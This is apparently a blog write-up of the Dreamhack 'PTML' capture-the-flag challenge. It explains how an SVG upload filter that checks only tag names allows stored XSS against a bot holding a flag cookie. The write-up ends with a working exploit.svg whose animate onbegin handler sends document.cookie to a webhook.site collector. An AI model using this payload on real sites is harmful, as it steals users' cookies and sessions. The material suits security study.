---
title: "Dreamhack: PTML"
date: 2025-08-13
tags:
  - web
  - ctf
  - svg
  - xss
draft: false
---
##### Link : [PTML](https://dreamhack.io/wargame/challenges/1937)

##### Description
```
It's a service visualizing SVG file.
Find vulnerability of the system and get the flag!
```

# Solve

## Finding the Foothold

When I first encountered this challenge, the first thing I looked at was the `Dockerfile`. In CTFs, the environment configuration often holds the core intent of the problem. As expected, I found that `google-chrome-stable` and `chromedriver` were being installed, which led me to my first hypothesis: 'An automated bot exists.'

```text title="Dockerfile"
...
# Add Google Chrome's official GPG key and setup repository
RUN wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add - && \
    echo 'deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main' > /etc/apt/sources.list.d/google-chrome.list

# Install the latest stable version of Google Chrome
RUN apt-get update -y && apt-get install -y google-chrome-stable

# Fetch the latest ChromeDriver version...
...
```

Next, I analyzed the server logic in `app.py`. The structure was such that after a successful file upload (`POST /upload`), the `read_file` function was called. Its content turned my hypothesis into certainty. As the code below shows, the bot gets the `flag` value injected as a cookie and then directly visits the page that includes my uploaded file.

```python title="deply/app.py"
def read_file(filename):
    driver = None
    cookie = {"name": "flag", "value": FLAG} # Create cookie with the FLAG
    ...
    try:
        ...
        driver = webdriver.Chrome(service=service, options=options)
        ...
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie) # Inject cookie into the bot's browser
        driver.get(f"http://127.0.0.1:8000/?file=uploads/{filename}") # Visit my file's page
        ...
```

All that was left was to execute a script in the bot's browser—a classic Cross-Site Scripting (XSS) scenario. I examined the client-side code, `main.py`, to find my foothold. The `load_svg_from_string` function contained a filter for SVG tags, but it had a critical flaw.

```python title="deploy/static/main.py"
def load_svg_from_string(svg_string):
    ...
    allowed_elements = [ ... ]

    elements = doc.getElementsByTagName("*")
    for element in elements:
        # It only checks the tag's name, not its attributes!
        if element.tagName not in allowed_elements:
            raise ValueError(f"Disallowed SVG element found: {element.tagName}")

    return doc.documentElement
```

With this, all the pieces fell into place. **"A bot with the flag cookie opens an SVG file I upload, on a page with no attribute filtering."** This was the clear foothold I had established.



## Planning the Attack

With the foothold secured, the success of the attack depended on the payload. Common XSS vectors like `onerror` on an `<img>` tag are often blocked by modern browsers' security policies, so I needed a more reliable method. I went back to the `allowed_elements` list to find a feature **native to the SVG standard**.

```python title="deploy/static/main.py"
allowed_elements = [
    "svg", "path", "rect", "circle", "ellipse", "line", "polyline", "polygon",
    "text", "tspan", "textPath", "altGlyph", "altGlyphDef", "altGlyphItem",
    "glyphRef", "altGlyph", "animate", "animateColor", "animateMotion", // animate-related tags
    "animateTransform", "mpath", "set", "desc", "title", "metadata",
    "defs", "g", "symbol", "use", "image", "switch", "style"
]
```

The `<animate>` tag stood out. Event handlers like `onbegin` are part of the SVG standard, not HTML, so I reasoned that a browser would more likely trust it as a 'legitimate animation function'. The plan was clear: create an SVG with a shape, insert a meaningless animation that starts on load, and use the `onbegin` event handler to exfiltrate the cookie.



## Execution

Putting the plan into action was straightforward.

1. **Prepare a Listener:** I used [Webhook.site](https://webhook.site) as an endpoint to receive the cookie.
2. **Craft the Payload:** The following is the final, completed SVG code for the attack.

```xml titl="exploit.svg"
<svg xmlns="http://www.w3.org/2000/svg">
    <circle cx="1" cy="1" r="1">
        <animate attributeName="r" from="1" to="1" begin="0s"
        onbegin="location.href='https://webhook.site/YOUR_UNIQUE_ID?d='+document.cookie" />
    </circle>
</svg>
```

3. **Upload and Verify:** I uploaded the crafted `exploit.svg` file through the web application. A moment later, a new request appeared on my Webhook.site page. And in its query parameters, the `flag` value I was looking for was clearly visible. ✅

![[Notes_API-20250813161308496.png]]